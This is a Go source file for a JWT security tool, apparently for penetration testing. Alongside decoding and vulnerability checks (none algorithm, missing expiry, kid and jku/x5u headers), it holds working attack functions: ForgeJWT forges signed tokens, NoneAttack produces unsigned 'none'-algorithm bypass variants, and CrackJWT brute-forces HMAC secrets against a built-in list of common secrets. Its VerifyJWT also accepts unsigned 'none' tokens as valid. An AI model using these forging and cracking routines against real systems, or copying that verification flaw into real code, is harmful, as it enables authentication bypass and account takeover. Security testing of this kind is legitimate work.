package jwt

import (
	"crypto/hmac"
	"crypto/sha256"
	"crypto/sha512"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"hash"
	"strings"
	"time"
)

// JWT represents a decoded JWT token
type JWT struct {
	Raw       string
	Header    map[string]interface{}
	Payload   map[string]interface{}
	Signature string
	Valid     bool
	Algorithm string
}

// VulnerabilityCheck represents a security check result
type VulnerabilityCheck struct {
	Name        string
	Vulnerable  bool
	Description string
	Severity    string
}

// DecodeJWT decodes a JWT without verification
func DecodeJWT(token string) (*JWT, error) {
	parts := strings.Split(token, ".")
	if len(parts) != 3 {
		return nil, fmt.Errorf("invalid JWT format: expected 3 parts, got %d", len(parts))
	}

	jwt := &JWT{
		Raw:       token,
		Signature: parts[2],
	}

	// Decode header
	headerJSON, err := base64URLDecode(parts[0])
	if err != nil {
		return nil, fmt.Errorf("failed to decode header: %v", err)
	}

	if err := json.Unmarshal(headerJSON, &jwt.Header); err != nil {
		return nil, fmt.Errorf("failed to parse header JSON: %v", err)
	}

	// Extract algorithm
	if alg, ok := jwt.Header["alg"].(string); ok {
		jwt.Algorithm = alg
	}

	// Decode payload
	payloadJSON, err := base64URLDecode(parts[1])
	if err != nil {
		return nil, fmt.Errorf("failed to decode payload: %v", err)
	}

	if err := json.Unmarshal(payloadJSON, &jwt.Payload); err != nil {
		return nil, fmt.Errorf("failed to parse payload JSON: %v", err)
	}

	return jwt, nil
}

// VerifyJWT verifies a JWT signature with the given secret
func VerifyJWT(token, secret string) (*JWT, error) {
	jwt, err := DecodeJWT(token)
	if err != nil {
		return nil, err
	}

	parts := strings.Split(token, ".")
	signingInput := parts[0] + "." + parts[1]

	var expectedSig string

	switch jwt.Algorithm {
	case "HS256":
		expectedSig = signHS(signingInput, secret, sha256.New)
	case "HS384":
		expectedSig = signHS(signingInput, secret, sha512.New384)
	case "HS512":
		expectedSig = signHS(signingInput, secret, sha512.New)
	case "none":
		// No signature required
		jwt.Valid = jwt.Signature == "" || jwt.Signature == "."
		return jwt, nil
	default:
		return jwt, fmt.Errorf("unsupported algorithm: %s", jwt.Algorithm)
	}

	jwt.Valid = jwt.Signature == expectedSig
	return jwt, nil
}

// signHS signs using HMAC-SHA
func signHS(input, secret string, hashFunc func() hash.Hash) string {
	h := hmac.New(hashFunc, []byte(secret))
	h.Write([]byte(input))
	return base64URLEncode(h.Sum(nil))
}

// ForgeJWT creates a new JWT with the given payload and secret
func ForgeJWT(payload map[string]interface{}, secret string, algorithm string) (string, error) {
	if algorithm == "" {
		algorithm = "HS256"
	}

	header := map[string]interface{}{
		"alg": algorithm,
		"typ": "JWT",
	}

	headerJSON, err := json.Marshal(header)
	if err != nil {
		return "", fmt.Errorf("failed to encode header: %v", err)
	}

	payloadJSON, err := json.Marshal(payload)
	if err != nil {
		return "", fmt.Errorf("failed to encode payload: %v", err)
	}

	headerB64 := base64URLEncode(headerJSON)
	payloadB64 := base64URLEncode(payloadJSON)
	signingInput := headerB64 + "." + payloadB64

	var signature string

	switch algorithm {
	case "HS256":
		signature = signHS(signingInput, secret, sha256.New)
	case "HS384":
		signature = signHS(signingInput, secret, sha512.New384)
	case "HS512":
		signature = signHS(signingInput, secret, sha512.New)
	case "none":
		signature = ""
	default:
		return "", fmt.Errorf("unsupported algorithm: %s", algorithm)
	}

	return signingInput + "." + signature, nil
}

// NoneAttack creates a JWT with algorithm "none"
func NoneAttack(token string) ([]string, error) {
	jwt, err := DecodeJWT(token)
	if err != nil {
		return nil, err
	}

	// Create variations with "none" algorithm
	variations := []string{"none", "None", "NONE", "nOnE"}
	var results []string

	for _, alg := range variations {
		forged, err := ForgeJWT(jwt.Payload, "", alg)
		if err == nil {
			results = append(results, forged)
		}

		// Also try without signature
		header := map[string]interface{}{
			"alg": alg,
			"typ": "JWT",
		}
		headerJSON, _ := json.Marshal(header)
		payloadJSON, _ := json.Marshal(jwt.Payload)

		noSig := base64URLEncode(headerJSON) + "." + base64URLEncode(payloadJSON) + "."
		results = append(results, noSig)
	}

	return results, nil
}

// CrackJWT attempts to crack the JWT secret using a wordlist
func CrackJWT(token string, wordlist []string) (string, bool) {
	jwt, err := DecodeJWT(token)
	if err != nil {
		return "", false
	}

	parts := strings.Split(token, ".")
	signingInput := parts[0] + "." + parts[1]

	for _, secret := range wordlist {
		var expectedSig string

		switch jwt.Algorithm {
		case "HS256":
			expectedSig = signHS(signingInput, secret, sha256.New)
		case "HS384":
			expectedSig = signHS(signingInput, secret, sha512.New384)
		case "HS512":
			expectedSig = signHS(signingInput, secret, sha512.New)
		default:
			continue
		}

		if expectedSig == jwt.Signature {
			return secret, true
		}
	}

	return "", false
}

// CheckVulnerabilities checks JWT for common vulnerabilities
func CheckVulnerabilities(jwt *JWT) []VulnerabilityCheck {
	var checks []VulnerabilityCheck

	// Check for "none" algorithm
	if jwt.Algorithm == "none" || jwt.Algorithm == "None" || jwt.Algorithm == "NONE" {
		checks = append(checks, VulnerabilityCheck{
			Name:        "Algorithm None",
			Vulnerable:  true,
			Description: "JWT uses 'none' algorithm - signature not verified",
			Severity:    "CRITICAL",
		})
	}

	// Check for weak algorithm
	if jwt.Algorithm == "HS256" {
		checks = append(checks, VulnerabilityCheck{
			Name:        "Weak HMAC Algorithm",
			Vulnerable:  false, // Potential, not confirmed
			Description: "HS256 may be vulnerable to brute-force if weak secret is used",
			Severity:    "MEDIUM",
		})
	}

	// Check for missing expiration
	if _, ok := jwt.Payload["exp"]; !ok {
		checks = append(checks, VulnerabilityCheck{
			Name:        "Missing Expiration",
			Vulnerable:  true,
			Description: "JWT has no expiration claim (exp) - token never expires",
			Severity:    "MEDIUM",
		})
	} else {
		// Check if already expired
		if exp, ok := jwt.Payload["exp"].(float64); ok {
			expTime := time.Unix(int64(exp), 0)
			if time.Now().After(expTime) {
				checks = append(checks, VulnerabilityCheck{
					Name:        "Expired Token",
					Vulnerable:  true,
					Description: fmt.Sprintf("JWT expired at %s", expTime.Format(time.RFC3339)),
					Severity:    "INFO",
				})
			}
		}
	}

	// Check for sensitive data in payload
	sensitiveKeys := []string{"password", "secret", "api_key", "apikey", "private_key", "credit_card"}
	for key := range jwt.Payload {
		for _, sensitive := range sensitiveKeys {
			if strings.Contains(strings.ToLower(key), sensitive) {
				checks = append(checks, VulnerabilityCheck{
					Name:        "Sensitive Data in Payload",
					Vulnerable:  true,
					Description: fmt.Sprintf("JWT contains potentially sensitive field: %s", key),
					Severity:    "HIGH",
				})
				break
			}
		}
	}

	// Check for "kid" header injection possibilities
	if kid, ok := jwt.Header["kid"]; ok {
		kidStr := fmt.Sprintf("%v", kid)
		if strings.Contains(kidStr, "/") || strings.Contains(kidStr, "..") || strings.Contains(kidStr, ";") {
			checks = append(checks, VulnerabilityCheck{
				Name:        "Potential KID Injection",
				Vulnerable:  true,
				Description: fmt.Sprintf("Kid header contains suspicious characters: %s", kidStr),
				Severity:    "HIGH",
			})
		}
	}

	// Check for JKU/X5U header (URL-based key fetching)
	if _, ok := jwt.Header["jku"]; ok {
		checks = append(checks, VulnerabilityCheck{
			Name:        "JKU Header Present",
			Vulnerable:  true,
			Description: "JWT uses jku header - potential SSRF/key injection if not validated",
			Severity:    "HIGH",
		})
	}
	if _, ok := jwt.Header["x5u"]; ok {
		checks = append(checks, VulnerabilityCheck{
			Name:        "X5U Header Present",
			Vulnerable:  true,
			Description: "JWT uses x5u header - potential SSRF/key injection if not validated",
			Severity:    "HIGH",
		})
	}

	return checks
}

// GetClaimTime extracts and formats a time claim
func GetClaimTime(jwt *JWT, claim string) string {
	if val, ok := jwt.Payload[claim]; ok {
		if num, ok := val.(float64); ok {
			t := time.Unix(int64(num), 0)
			return t.Format(time.RFC3339)
		}
	}
	return ""
}

// base64URLEncode encodes to base64url without padding
func base64URLEncode(data []byte) string {
	encoded := base64.RawURLEncoding.EncodeToString(data)
	return encoded
}

// base64URLDecode decodes from base64url (handles padding)
func base64URLDecode(s string) ([]byte, error) {
	// Add padding if needed
	switch len(s) % 4 {
	case 2:
		s += "=="
	case 3:
		s += "="
	}

	// Replace URL-safe characters
	s = strings.ReplaceAll(s, "-", "+")
	s = strings.ReplaceAll(s, "_", "/")

	return base64.StdEncoding.DecodeString(s)
}

// DisplayJWT displays decoded JWT information
func DisplayJWT(jwt *JWT) {
	fmt.Println("\n[JWT DECODED]")
	fmt.Println(strings.Repeat("=", 60))

	// Header
	fmt.Println("\n[Header]")
	headerJSON, _ := json.MarshalIndent(jwt.Header, "", "  ")
	fmt.Println(string(headerJSON))

	// Payload
	fmt.Println("\n[Payload]")
	payloadJSON, _ := json.MarshalIndent(jwt.Payload, "", "  ")
	fmt.Println(string(payloadJSON))

	// Signature
	fmt.Println("\n[Signature]")
	fmt.Printf("Algorithm: %s\n", jwt.Algorithm)
	if len(jwt.Signature) > 50 {
		fmt.Printf("Signature: %s...\n", jwt.Signature[:50])
	} else {
		fmt.Printf("Signature: %s\n", jwt.Signature)
	}

	// Time claims
	fmt.Println("\n[Time Claims]")
	if iat := GetClaimTime(jwt, "iat"); iat != "" {
		fmt.Printf("Issued At (iat): %s\n", iat)
	}
	if exp := GetClaimTime(jwt, "exp"); exp != "" {
		fmt.Printf("Expires (exp): %s\n", exp)
	}
	if nbf := GetClaimTime(jwt, "nbf"); nbf != "" {
		fmt.Printf("Not Before (nbf): %s\n", nbf)
	}

	fmt.Println()
}

// DisplayVulnerabilities displays vulnerability check results
func DisplayVulnerabilities(checks []VulnerabilityCheck) {
	fmt.Println("\n[SECURITY CHECKS]")
	fmt.Println(strings.Repeat("=", 60))

	if len(checks) == 0 {
		fmt.Println("No vulnerabilities detected.")
		return
	}

	for _, check := range checks {
		status := "[OK]"
		if check.Vulnerable {
			status = fmt.Sprintf("[%s]", check.Severity)
		}
		fmt.Printf("\n%s %s\n", status, check.Name)
		fmt.Printf("    %s\n", check.Description)
	}

	fmt.Println()
}

// CommonSecrets returns a list of common JWT secrets for testing
func CommonSecrets() []string {
	return []string{
		"secret", "password", "123456", "secret123", "password123",
		"admin", "test", "jwt", "key", "private",
		"supersecret", "secretkey", "mysecret", "mypassword",
		"changeme", "changeit", "default", "example",
		"your-256-bit-secret", "your-384-bit-secret", "your-512-bit-secret",
		"shhhhh", "shhhhhared-secret", "keyboard cat",
		"gZH75aKtMN3Yj0iPS846GF76aKtMN3Yj0",
		"c2VjcmV0", "c2VjcmV0a2V5", // base64 of "secret" and "secretkey"
		"HS256-secret", "HS384-secret", "HS512-secret",
		"jwt-secret", "jwt_secret", "JWT_SECRET",
		"app-secret", "app_secret", "APP_SECRET",
		"auth-secret", "auth_secret", "AUTH_SECRET",
		"token-secret", "token_secret", "TOKEN_SECRET",
	}
}
